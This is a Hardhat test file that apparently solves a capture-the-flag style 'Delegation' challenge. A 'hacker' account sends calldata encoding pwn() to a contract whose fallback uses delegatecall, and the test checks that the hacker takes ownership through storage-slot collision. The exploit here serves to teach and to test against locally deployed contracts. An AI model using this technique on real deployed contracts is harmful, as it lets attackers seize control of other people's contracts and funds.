import { defaultAbiCoder } from "@ethersproject/abi";
import { expect } from "chai";
import { ethers } from "hardhat";
import { waitForTx } from "../utils/tx";

describe("Delegation", function () {
  // about storage slot
  it("Get ownership using delegate call", async function () {
    const [owner, hacker] = await ethers.getSigners();
    const Delegation = await ethers.getContractFactory("Delegation");
    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(owner.address);
    await delegate.deployed();
    const delegation = await Delegation.deploy(delegate.address);
    await delegation.deployed();

    let ABI = ["function pwn()"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("pwn");
    expect(await delegate.owner(), "delegate's owner should be deployer").to.equal(owner.address);
    expect(await delegation.owner(), "delegation's owner should be deployer").to.equal(owner.address);

    await waitForTx(
      await hacker.sendTransaction({
        from: hacker.address,
        to: delegation.address,
        data,
      })
    );
    expect(await delegation.owner(), "delegation owner should be hacker").to.equal(hacker.address);
  });
});
